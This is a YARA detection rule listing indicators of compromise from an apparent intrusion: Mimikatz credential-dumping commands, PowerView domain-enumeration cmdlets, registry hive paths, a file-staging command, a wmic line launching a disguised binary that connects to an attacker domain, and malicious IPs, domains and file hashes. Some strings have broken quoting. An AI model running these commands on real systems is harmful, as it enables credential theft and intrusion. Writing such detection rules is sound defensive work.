import "hash"
    
rule IOCs
{
    strings:
	$1 = "whoami"
	$2 = "nltest"
	$3 = "wmic /node"
	$4 = "wmic process"
	$5 = "powershell ([adsisearcher]"((samaccountname=<redacted>))").Findall().Properties"
	$6 = "powershell Get-WmiObject -Class Win32_Service -Computername"
	$7 = "powershell Get-WindowsDriver -Online -All"
	$8 = "ntoskrnl.exe"
	$9 = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"
	$10 = "privilege::debug"
	$11 = "lsadump::cache"
	$12 = "lsadump::secrets"
	$13 = "lsadump::sam"
	$14 = "sekurlsa::logonpasswords"
	$15 = "HKLM\SYSTEM"
	$16 = "HKLM\SAM"
	$17 = "HKLM\SECURITY"
	$18 = "powershell Compress-Archive -Path C:\Windows\temp\1\ -DestinationPath C:\Windows\temp\s.zip -Force & del C:\Windows\temp\1 /F /Q"
	$19 = "Get-NetGroup"
	$20 = "Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""
	$21 = "Get-NetDiDomain"
	$22 = "Get-AdUser"
	$23 = "Get-DomainUser -UserName"
	$24 = "Get-NetUser -PreauthNotRequire"
	$25 = "Get-NetComputer | select samaccountname"
	$26 = "Get-NetUser -SPN | select serviceprincipalname"
	$27 = "rr.exe"
	$28 = "65.20.97.203"
	$29 = "Poetpages.com"
	$30 = "wmic process call create "C:\Program Files\Windows Defender Advanced Threat Protection\Sense.exe -connect poetpages.com -pass M554-0sddsf2@34232fsl45t31""
	$31 = "AclNumsInvertHost.dll"
	$32 = "65.21.51.58"
	$33 = "103.76.128.34"
	$34 = "matclick.com"
    condition:
        any of them or
        hash.sha256(0, filesize) == "01B5F7094DE0B2C6F8E28AA9A2DED678C166D615530E595621E692A9C0240732" or
        hash.sha256(0, filesize) == "34C8F155601A3948DDB0D60B582CFE87DE970D443CC0E05DF48B1A1AD2E42B5E" or
        hash.sha256(0, filesize) == "620D2BF14FE345EEF618FDD1DAC242B3A0BB65CCB75699FE00F7C671F2C1D869" or
        hash.sha256(0, filesize) == "773F0102720AF2957859D6930CD09693824D87DB705B3303CEF9EE794375CE13" or
        hash.sha256(0, filesize) == "7B666B978DBBE7C032CEF19A90993E8E4922B743EE839632BFA6D99314EA6C53" or
        hash.sha256(0, filesize) == "8AFB71B7CE511B0BCE642F46D6FC5DD79FAD86A58223061B684313966EFEF9C7" or
        hash.sha256(0, filesize) == "971F0CED6C42DD2B6E3EA3E6C54D0081CF9B06E79A38C2EDE3A2C5228C27A6DC" or
        hash.sha256(0, filesize) == "CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF" or
        hash.sha256(0, filesize) == "CD3584D61C2724F927553770924149BB51811742A461146B15B34A26C92CAD43" or
        hash.sha256(0, filesize) == "EBE231C90FAD02590FC56D5840ACC63B90312B0E2FEE7DA3C7606027ED92600E" or
        hash.sha256(0, filesize) == "F1B40E6E5A7CBC22F7A0BD34607B13E7E3493B8AAD7431C47F1366F0256E23EB" or
        hash.sha256(0, filesize) == "C7B01242D2E15C3DA0F45B8ADEC4E6913E534849CDE16A2A6C480045E03FBEE4" or
        hash.sha256(0, filesize) == "4BF1915785D7C6E0987EB9C15857F7AC67DC365177A1707B14822131D43A6166" or
        hash.sha256(0, filesize) == "18101518EAE3EEC6EBE453DE4C4C380160774D7C3ED5C79E1813013AC1BB0B93" or
        hash.sha256(0, filesize) == "19F1EF66E449CF2A2B0283DBB756850CCA396114286E1485E35E6C672C9C3641" or
        hash.sha256(0, filesize) == "1E74CF0223D57FD846E171F4A58790280D4593DF1F23132044076560A5455FF8" or
        hash.sha256(0, filesize) == "219FB90D2E88A2197A9E08B0E7811E2E0BD23D59233287587CCC4642C2CF3D67" or
        hash.sha256(0, filesize) == "B53E27C79EED8531B1E05827ACE2362603FB9F77F53CEE2E34940D570217CBF7" or
        hash.sha256(0, filesize) == "C37C109171F32456BBE57B8676CC533091E387E6BA733FBAA01175C43CFB6EBD" or
        hash.sha256(0, filesize) == "C40A8006A7B1F10B1B42FDD8D6D0F434BE503FB3400FB948AC9AB8DDFA5B78A0" or
        hash.sha256(0, filesize) == "F6194121E1540C3553273709127DFA1DAAB96B0ACFAB6E92548BFB4059913C69" or
        hash.sha256(0, filesize) == "D724728344FCF3812A0664A80270F7B4980B82342449A8C5A2FA510E10600443" or
        hash.sha256(0, filesize) == "4EE70128C70D646C5C2A9A17AD05949CB1FBF1043E9D671998812B2DCE75CF0F" or
        hash.sha256(0, filesize) == "950ADBAF66AB214DE837E6F1C00921C501746616A882EA8C42F1BAD5F9B6EFF4" or
        hash.sha256(0, filesize) == "CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF"
}